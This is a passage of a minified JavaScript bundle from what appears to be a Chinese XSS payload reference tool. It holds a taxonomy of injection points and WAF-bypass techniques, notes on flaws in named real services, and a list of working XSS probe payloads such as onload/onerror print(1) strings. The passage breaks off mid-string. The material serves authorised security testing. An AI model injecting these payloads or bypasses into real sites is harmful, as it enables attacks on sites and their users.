C&&(K=C(K)||K),e(A,function(S){var T=S.node,H=S.index,q=S.pos,G=S.key,ju=S.parentPos,$=S.level,au=S.nodes,uu={node:T,nodes:au,index:H,key:G,pos:q,level:$},eu=F(G,q);z[q]=uu,N[eu]=uu,uu.parent=z[ju],uu.parent&&(uu.parent.children=uu.parent.children||[],uu.parent.children.push(uu)),y&&y(uu,K)},{externalGetKey:p,childrenPropName:B,fieldNames:r}),_&&_(K),K}function D(A,E){var C=E.expandedKeys,y=E.selectedKeys,_=E.loadedKeys,O=E.loadingKeys,B=E.checkedKeys,r=E.halfCheckedKeys,P=E.dragOverNodeKey,p=E.dropPosition,z=E.keyEntities,N=z[A],K={eventKey:A,expanded:C.indexOf(A)!==-1,selected:y.indexOf(A)!==-1,loaded:_.indexOf(A)!==-1,loading:O.indexOf(A)!==-1,checked:B.indexOf(A)!==-1,halfChecked:r.indexOf(A)!==-1,pos:String(N?N.pos:""),dragOver:P===A&&p===0,dragOverGapTop:P===A&&p===-1,dragOverGapBottom:P===A&&p===1};return K}function d(A){var E=A.data,C=A.expanded,y=A.selected,_=A.checked,O=A.loaded,B=A.loading,r=A.halfChecked,P=A.dragOver,p=A.dragOverGapTop,z=A.dragOverGapBottom,N=A.pos,K=A.active,S=A.eventKey,T=Object(l.a)(Object(l.a)({},E),{},{expanded:C,selected:y,checked:_,loaded:O,loading:B,halfChecked:r,dragOver:P,dragOverGapTop:p,dragOverGapBottom:z,pos:N,active:K,key:S});return"props"in T||Object.defineProperty(T,"props",{get:function(){return Object(t.a)(!1,"Second param return from event is node data instead of TreeNode instance. Please read value directly instead of reading from `props`."),A}}),T}},"9IgH":function(nu,U){nu.exports="data:image/png;base64,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"},"9z6I":function(nu,U,f){"use strict";f.d(U,"a",function(){return B});var R=f("6UJt"),h=f("DFOY"),l=f("q1tI"),j=f.n(l),n=f("kfBs"),u=f.n(n),t=f("k1fw"),s=f("+ULl"),m=[Object(t.a)(Object(t.a)({},Object(s.b)("\u5E38\u89C4\u8F93\u5165\u70B9")),{},{children:[Object(t.a)({},Object(s.b)("url\u53C2\u6570")),Object(t.a)({},Object(s.b)("POST\u8BF7\u6C42\u53C2\u6570",["\u2460 \u670D\u52A1\u5668\u8FD4\u56DE\uFF0C\u518D\u628A\u53C2\u6570\uFF0C\u5D4C\u8FDBHTML\u3002\uFF08\u5982\u540C DOM\u578BXSS \uFF09"]))]}),Object(t.a)(Object(t.a)({},Object(s.b)("\u9690\u85CF\u8F93\u5165\u70B9")),{},{children:[Object(t.a)({},Object(s.b)('<input type="hidden">',["\u9690\u5F0Finput"]))]}),Object(t.a)(Object(t.a)({},Object(s.b)("\u81EA\u52A8\u8F93\u5165\u70B9")),{},{children:[Object(t.a)({},Object(s.b)("XRay",[""]))]}),Object(t.a)(Object(t.a)({},Object(s.b)("\u9006\u5411\u601D\u7EF4")),{},{children:[Object(t.a)({},Object(s.b)("\u4ECE\u8F93\u51FA\u70B9\uFF0C\u5BFB\u627EXSS",[j.a.createElement("div",null,"\u5927\u6982\u601D\u8DEF\u5982\u4E0B\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"7.1 \u5148\u627E\u5230\u8F93\u51FA\u70B9\uFF0C\u7136\u540E\u731C\u6D4B\u6B64\u5904\u8F93\u51FA\u662F\u5426\u4F1A\u88AB\u8FC7\u6EE4\u3002"),j.a.createElement("li",null,"7.2 \u5982\u679C\u89C9\u5F97\u53EF\u80FD\u6CA1\u8FC7\u6EE4\uFF0C\u6211\u4EEC\u518D\u627E\u5230\u8FD9\u4E2A\u8F93\u51FA\u662F\u5728\u54EA\u91CC\u8F93\u5165\u7684\u3002"),j.a.createElement("li",null,"7.3 \u63A5\u7740\u5F00\u59CB\u6D4B\u8BD5\u8F93\u5165\uFF0C\u770B\u8F93\u51FA\u7684\u6548\u679C\u3002"),j.a.createElement("li",null,"7.4 \u5982\u679C\u6CA1\u8FC7\u6EE4\uFF0C\u90A3\u4E48\u4F60\u5C31\u6210\u529F\u4E86\uFF0C\u5426\u5219\u4F60\u53EF\u4EE5\u653E\u5F03\u6389\u5B83\u3002")))]))]})],F=[Object(t.a)(Object(t.a)({},Object(s.b)("\u521D\u7EA7")),{},{children:[Object(t.a)({},Object(s.b)("\u8054\u60F3\u5546\u57CE",["\u591A\u4E2A\u4F4E\u7EA7\u6F0F\u6D1E"])),Object(t.a)({},Object(s.b)("Tumblr",["\u5206\u4EAB\u53D1\u5E16\uFF0C\u5E16\u5B50\u5185\u7684\u7F51\u9875\u94FE\u63A5\uFF0C\u53EF\u5D4C\u5165XSS"]))]}),Object(t.a)(Object(t.a)({},Object(s.b)("\u4E2D\u7EA7")),{},{children:[Object(t.a)(Object(t.a)({},Object(s.b)("\u4E00\u8D77\u5199Office")),{},{children:[Object(t.a)({},Object(s.b)("\u4E0A\u4F20\u5934\u50CF\uFF0C\u4EFB\u610FURL")),Object(t.a)(Object(t.a)({},Object(s.b)("\u4FEE\u6539\u5BC6\u7801\u63A5\u53E3")),{},{children:[Object(t.a)({},Object(s.b)("POST\u8BF7\u6C42\uFF0CGET\u4E5F\u53EF\u8C03\u7528")),Object(t.a)({},Object(s.b)("\u8BF7\u6C42\u9ED8\u8BA4\u643A\u5E26 xtoken\uFF1B\u4F46\u5220\u6389 xtoken \u4E5F\u80FD\u6210\u529F"))]})]}),Object(t.a)(Object(t.a)({},Object(s.b)("\u6709\u9053\u4E91\u7B14\u8BB0")),{},{children:[Object(t.a)(Object(t.a)({},Object(s.b)("\u7C98\u8D34")),{},{children:[Object(t.a)({},Object(s.b)("\u7C98\u8D34\u56FE\u7247",["\u5730\u5740\u672A\u505A\u8F6C\u94FE"])),Object(t.a)({},Object(s.b)("\u7C98\u8D34\u4E00\u6BB5\u7F51\u9875\u56FE\u6587",["\u88AB\u5F53\u505A HTML \u7247\u6BB5\u5904\u7406","\u672A\u505A \u56FE\u7247\u8F6C\u50A8 "]))]})]})]}),Object(t.a)(Object(t.a)({},Object(s.b)("\u9AD8\u7EA7")),{},{children:[Object(t.a)(Object(t.a)({},Object(s.b)("\u5934\u6761\u641C\u7D22",["\u641C\u7D22\u3010\u5C0F\u89C6\u9891\u3011\u65F6\uFF0C\u901A\u8FC7<script>\u3010\u5173\u952E\u5B57\u3011\uFF0C\u89E6\u53D1\u4E86\u3010\u6765\u81EA\u6296\u97F3\u6807\u9898\u3011\u7684\u3010XSS\u3011"])),Object(s.b)("CodeMirror\uFF0C\u6211\u81EA\u5DF1\u53D1\u73B0\u7684\u6F0F\u6D1E",["\u89C1\u3010Laverna\u3011APP\u7684\u8868\u73B0\u3002"]))]})],k=f("fWQN"),o=f("mtLc"),c=f("ysNt"),b=c.e.singleATag_blank,e;(function(r){r.\u6309\u9636\u6BB5="\u6309\u9636\u6BB5",r["1.\u6295\u77F3\u95EE\u8DEF\uFF0C\u4ED9\u4EBA\u6307\u8DEF"]="1.\u6295\u77F3\u95EE\u8DEF\uFF0C\u4ED9\u4EBA\u6307\u8DEF",r.\u5168\u77E5\u5168\u80FD\u5168\u5584="\u5168\u77E5\u5168\u80FD\u5168\u5584",r.\u7231\u56FD\u9752\u5E74="\u7231\u56FD\u9752\u5E74",r["123<br>321"]="123<br>321",r["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"]="2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011",r["3.\u66F4\u52A0\u5BBD\u6CDB\u7684\u89E3\u6CD5"]="3.\u66F4\u52A0\u5BBD\u6CDB\u7684\u89E3\u6CD5",r["\u4E8C\u5206\u67E5\u627E\u6CD5 \uFF0C\u6765\u5B9A\u4F4D\u3010\u654F\u611F\u8BCD\u6C47\u3011"]="\u4E8C\u5206\u67E5\u627E\u6CD5 \uFF0C\u6765\u5B9A\u4F4D\u3010\u654F\u611F\u8BCD\u6C47\u3011",r["4.\u7528\u3010\u62BD\u67E5\u3011\u5F62\u5F0F\uFF0C\u9010\u4E2A\u6392\u9664"]="4.\u7528\u3010\u62BD\u67E5\u3011\u5F62\u5F0F\uFF0C\u9010\u4E2A\u6392\u9664",r.html\u4E8B\u4EF6="html\u4E8B\u4EF6",r.\u6F0F\u6389\u7684\u4E8B\u4EF6="\u6F0F\u6389\u7684\u4E8B\u4EF6",r["\u3010src\u3011(\u5305\u62EChref)"]="\u3010src\u3011(\u5305\u62EChref)",r["<img>\u7684\u3010src\u3011"]="<img>\u7684\u3010src\u3011",r["<iframe>\u7684\u3010src\u3011"]="<iframe>\u7684\u3010src\u3011",r["<iframe>\u7684\u3010srcdoc\u3011"]="<iframe>\u7684\u3010srcdoc\u3011",r["<embed>\u7684\u3010src\u3011"]="<embed>\u7684\u3010src\u3011",r["<a>\u7684\u3010href\u3011"]="<a>\u7684\u3010href\u3011",r["<script>\u7684\u3010src\u3011"]="<script>\u7684\u3010src\u3011",r["\u57FA\u4E8E\u3010src\u3011\u7684\uFF0C\u66F4\u9AD8\u9636\u7528\u6CD5"]="\u57FA\u4E8E\u3010src\u3011\u7684\uFF0C\u66F4\u9AD8\u9636\u7528\u6CD5",r["\u591A\u5C42\u5D4C\u5957\u3010src\u3011\uFF0C\u3010\u7236src\u3011\u91CC\u9762\u518D\u5D4C\u5957\u3010\u5B50src\u3011"]="\u591A\u5C42\u5D4C\u5957\u3010src\u3011\uFF0C\u3010\u7236src\u3011\u91CC\u9762\u518D\u5D4C\u5957\u3010\u5B50src\u3011",r["5.\u6839\u636E\u7ECF\u9A8C\uFF0C\u4E00\u4E9B\u6613\u7A81\u7834\u7684\u8584\u5F31\u70B9"]="5.\u6839\u636E\u7ECF\u9A8C\uFF0C\u4E00\u4E9B\u6613\u7A81\u7834\u7684\u8584\u5F31\u70B9",r["<a>\u6807\u7B7E"]="<a>\u6807\u7B7E",r.\u6309\u573A\u666F="\u6309\u573A\u666F",r.\u7EAFHTML\u5185="\u7EAFHTML\u5185",r.\u5E38\u7528\u8BED\u53E5="\u5E38\u7528\u8BED\u53E5",r.\u9AD8\u53EF\u9760="\u9AD8\u53EF\u9760",r.\u8F83\u5E38\u89C4="\u8F83\u5E38\u89C4",r.\u5F88\u5947\u8469="\u5F88\u5947\u8469",r.\u4E2D\u53EF\u9760="\u4E2D\u53EF\u9760",r.\u4F4E\u53EF\u9760="\u4F4E\u53EF\u9760",r.bypass\u7ED5\u8FC7="bypass\u7ED5\u8FC7",r.\u5927\u5C0F\u5199\u654F\u611F="\u5927\u5C0F\u5199\u654F\u611F",r.\u5BF9\u7F16\u7801\u654F\u611F\u7684\u7B26\u53F7="\u5BF9\u7F16\u7801\u654F\u611F\u7684\u7B26\u53F7",r[":"]=":",r[";"]=";",r[","]=",",r["()"]="()",r["'"]="'",r['"']='"',r["`"]="`",r["."]=".",r["<>"]="<>",r["="]="=",r["/"]="/",r["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]="\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011",r.\u5B57\u7B26\u4E32\u53D8\u91CF="\u5B57\u7B26\u4E32\u53D8\u91CF",r.\u7F16\u7801\u65B9\u5F0F="\u7F16\u7801\u65B9\u5F0F",r.\u5BBD\u5B57\u8282="\u5BBD\u5B57\u8282",r["\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49"]="\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49",r.UrlEncode\u8DEF\u5F84\u7F16\u7801="UrlEncode\u8DEF\u5F84\u7F16\u7801",r["Unicode \u4E07\u56FD\u7801"]="Unicode \u4E07\u56FD\u7801",r["ASCII \u7F8E\u56FD\u7801"]="ASCII \u7F8E\u56FD\u7801",r.HTML\u5B9E\u4F53\u5316\u7F16\u7801="HTML\u5B9E\u4F53\u5316\u7F16\u7801",r["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"]="Base64\u7F16\u7801 - DataUrl\u534F\u8BAE",r.HTML5="HTML5",r["\u65B0 \u6807\u7B7E"]="\u65B0 \u6807\u7B7E",r["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"]="\u65B0 \u4E8B\u4EF6/\u5C5E\u6027",r.\u6807\u7B7E\u540D="\u6807\u7B7E\u540D",r["\u975E\u6807\u51C6\u5B57\u6BCD\u3001\u82F1\u6587\u4EE5\u5916\u7684\u5B57\u6BCD"]="\u975E\u6807\u51C6\u5B57\u6BCD\u3001\u82F1\u6587\u4EE5\u5916\u7684\u5B57\u6BCD",r["\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u3001\u5927\u5C0F\u5199\u6DF7\u5199"]="\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u3001\u5927\u5C0F\u5199\u6DF7\u5199",r["\u6362\u884C\u7B26\u3001\u56DE\u8F66\u7B26\u3001\u7A7A\u683C\u7B26\u3001\u5236\u8868\u7B26\u3001\u6362\u9875\u7B26\u3001NUL\u7B26\u53F7"]="\u6362\u884C\u7B26\u3001\u56DE\u8F66\u7B26\u3001\u7A7A\u683C\u7B26\u3001\u5236\u8868\u7B26\u3001\u6362\u9875\u7B26\u3001NUL\u7B26\u53F7",r.\u6362\u884C\u7B26="\u6362\u884C\u7B26",r.\u56DE\u8F66\u7B26="\u56DE\u8F66\u7B26",r.\u7A7A\u683C\u7B26="\u7A7A\u683C\u7B26",r["\u4F7F\u7528\u3010/**/\u6CE8\u91CA\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"]="\u4F7F\u7528\u3010/**/\u6CE8\u91CA\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011",r["\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"]="\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011",r.\u5236\u8868\u7B26="\u5236\u8868\u7B26",r.\u6362\u9875\u7B26="\u6362\u9875\u7B26",r.NUL\u7B26\u53F7="NUL\u7B26\u53F7",r.\u6CE8\u91CA="\u6CE8\u91CA",r["\u4E0D\u5B8C\u6574\u6807\u7B7E\u3001\u4E0D\u95ED\u5408\u6807\u7B7E"]="\u4E0D\u5B8C\u6574\u6807\u7B7E\u3001\u4E0D\u95ED\u5408\u6807\u7B7E",r.HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027="HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027",r.src\u5C5E\u6027="src\u5C5E\u6027",r["\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528"]="\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528",r.URL\u5927\u5C0F\u5199="URL\u5927\u5C0F\u5199",r.JSFuck="JSFuck",r["\u5BF9\u3010html inline js\u3011\u7684\u8F6C\u4E49"]="\u5BF9\u3010html inline js\u3011\u7684\u8F6C\u4E49",r.\u5757\u7EA7JS\u4EE3\u7801\u5185="\u5757\u7EA7JS\u4EE3\u7801\u5185",r.eval\u76F8\u5173="eval\u76F8\u5173",r["error\u62A5\u9519\u3001Exception\u62A5\u9519"]="error\u62A5\u9519\u3001Exception\u62A5\u9519",r["function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027"]="function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027",r.Electron\u5E94\u7528="Electron\u5E94\u7528",r.\u57FA\u672CElectron\u8BED\u53E5="\u57FA\u672CElectron\u8BED\u53E5",r.DOM\u963B\u585E\u5668="DOM\u963B\u585E\u5668",r["\u672C\u5730\u8FC7\u6EE4\u5668\uFF08XSS Filter\uFF09"]="\u672C\u5730\u8FC7\u6EE4\u5668\uFF08XSS Filter\uFF09",r.MarkDown\u8D85\u94FE\u63A5="MarkDown\u8D85\u94FE\u63A5",r["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]="\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"})(e||(e={}));var v;(function(r){r.\u6982\u5FF5="\u6982\u5FF5",r["\u539F\u7406\u573A\u666F\uFF1A"]="\u539F\u7406\u573A\u666F\uFF1A",r["\u539F\u7406\uFF1A"]="\u539F\u7406\uFF1A",r["\u65E0\u6548\u573A\u5408\uFF1A"]="\u65E0\u6548\u573A\u5408\uFF1A",r["\u7F3A\u70B9\uFF1A"]="\u7F3A\u70B9\uFF1A",r["\u4F18\u70B9\uFF1A"]="\u4F18\u70B9\uFF1A",r["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"]="\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A",r["\u6539\u826F\uFF1A"]="\u6539\u826F\uFF1A",r["Url\u5730\u5740\u680F\uFF0C\u624B\u52A8\u8F93\u5165"]="Url\u5730\u5740\u680F\uFF0C\u624B\u52A8\u8F93\u5165",r["Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002"]="Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002",r["\u3010src\u3011\u5C5E\u6027"]="\u3010src\u3011\u5C5E\u6027",r["\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011"]="\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011",r["\u3010HTML\u3011\u7684 innerHTML\u3010\u503C\u3011 \u7684 JS"]="\u3010HTML\u3011\u7684 innerHTML\u3010\u503C\u3011 \u7684 JS",r["\u3010HTML\u3011\u7684 attribute\u3010\u503C\u3011 \u7684 JS"]="\u3010HTML\u3011\u7684 attribute\u3010\u503C\u3011 \u7684 JS",r["\u3010html inline js\u3011"]="\u3010html inline js\u3011",r["\u3010script block js\u3011"]="\u3010script block js\u3011"})(v||(v={}));var D="print()",d="javascript:print()",A=j.a.createElement(j.a.Fragment,null,j.a.createElement("div",null,"\u53EF\u4EE5\u5728\u3010",e.\u5757\u7EA7JS\u4EE3\u7801\u5185,"\u3011\u4E2D\u4F7F\u7528",j.a.createElement("ol",null,j.a.createElement("li",null,"_"))),j.a.createElement("div",null,"\u4E5F\u53EF\u4EE5\u5728\u3010",e.\u7EAFHTML\u5185,"\u3011\u3001\u3010",e.HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027,"\u3011\u4E2D\u4F7F\u7528\u3002",j.a.createElement("ol",null,j.a.createElement("li",null,"\u6B64\u65F6\uFF0C\u4E00\u822C\u8981\u5C06\u3010error=\u3011\u6539\u5199\u6210\u3010window.onerror=\u3011\uFF0C\u80FD\u591F\u6267\u884C")))),E=function(){function r(){Object(k.a)(this,r)}return Object(o.a)(r,null,[{key:"placePayloads",value:function(){var p={};function z(S,T){["\u659C\u6760",e["/"],e.\u7A7A\u683C\u7B26].find(function(H){return String(S.value).includes(H)})&&console.warn(T,JSON.parse(JSON.stringify(S)))}function N(S){if(S.children=S.children||[],!S.value)throw new Error("o.value \u4E0D\u5B58\u5728 ".concat(JSON.stringify(S)));var T=!!S.my_reference;if(!p[S.value]&&!T)p[S.value]=S.children;else if(T)console.log("\u662F\u3010reference\u5F15\u7528\u3011\u7C7B\u578B\uFF0C\u4E0D\u8BB0\u5F55\u3002\u8DF3\u8FC7",S.value);else throw new Error("\u8BE5\u672B\u68A2\uFF0C\u5DF2\u7ECF\u5B58\u5728\uFF01 ".concat(S.value))}function K(S){S.forEach(function(T){z(T,"\u53D1\u73B0\u5916\u5C42"),!T.children||T.children.length===0?(z(T,"\u5185\u5C42\u53D1\u73B0"),N(T)):(T.children.every(function(H){return H.my_reference===!0})&&N(T),K(T.children))})}K(this.options),console.log("this.options",JSON.parse(JSON.stringify(this.options))),console.log("leafEnds",p),this.payloads.forEach(function(S){S.tag.forEach(function(T){if(p[T]){var H;(H=p[T])===null||H===void 0||H.push(Object(t.a)({},Object(s.a)(S.name,S.desc,!0)))}else throw new Error("".concat(T," \u5BF9\u5E94\u7684\u6570\u7EC4\u4E0D\u5B58\u5728\uFF01"))})})}},{key:"saveSelect_Payload",value:function(p){localStorage.setItem(this.ls_key,JSON.stringify(p))}},{key:"loadSelect_Payload",value:function(){var p=localStorage.getItem(this.ls_key);if(p)return JSON.parse(p)}}]),r}();E.ls_key="select_payload",E.payloads=[{name:`  "'><svg/onload=print(1)//  `,desc:"\u3010\u53EF\u80FD\u662F\u6700\u68D2\u7684\u57FA\u7840\u65B9\u6848\u4E86\uFF0C\u53EF\u4EE5\u540C\u65F6\u6D4B\u8BD5 \u5C5E\u6027\u3001\u5355\u72EC\u6807\u7B7E \u3011",tag:[e["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:`  "'><img/onerror=print(1) src=0>//  `,desc:"\u3010\u53EF\u80FD\u662F\u6700\u68D2\u7684\u57FA\u7840\u65B9\u6848\u4E86\uFF0C\u53EF\u4EE5\u540C\u65F6\u6D4B\u8BD5 \u5C5E\u6027\u3001\u5355\u72EC\u6807\u7B7E \u3011",tag:[e["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <h1>test  ",tag:[e["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"]]},{name:"  <svg>  ",tag:[e["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"]]},{name:"  <svg/onload=print(1)>  ",tag:[e["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <svg/onload=print`1`>  ",tag:[e["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:`  "'autofocus/onfocus=print(1)//  `,desc:"\u3010\u548C \u7B2C1\u4E2A 